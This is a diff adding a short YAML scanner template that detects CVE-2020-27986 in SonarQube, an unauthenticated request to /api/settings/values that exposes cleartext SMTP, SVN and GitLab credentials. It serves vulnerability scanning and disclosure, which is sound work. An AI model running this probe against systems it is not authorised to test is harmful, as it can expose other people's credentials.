@@ -1,0 +1,19 @@
+name: SonarQube unauth CVE-2020-27986
+manual: true
+query: app="SonarQube"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/settings/values
+    expression: response.status == 200 && response.body.bcontains(b"sonaranalyzer-cs.nuget.packageVersion")
+      && response.body.bcontains(b"sonar.core.id")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27986
+  description: SonarQube 8.4.2.36762 allows remote attackers to discover cleartext
+    SMTP, SVN, and GitLab credentials via the api/settings/values URI.
+  tags: unauth
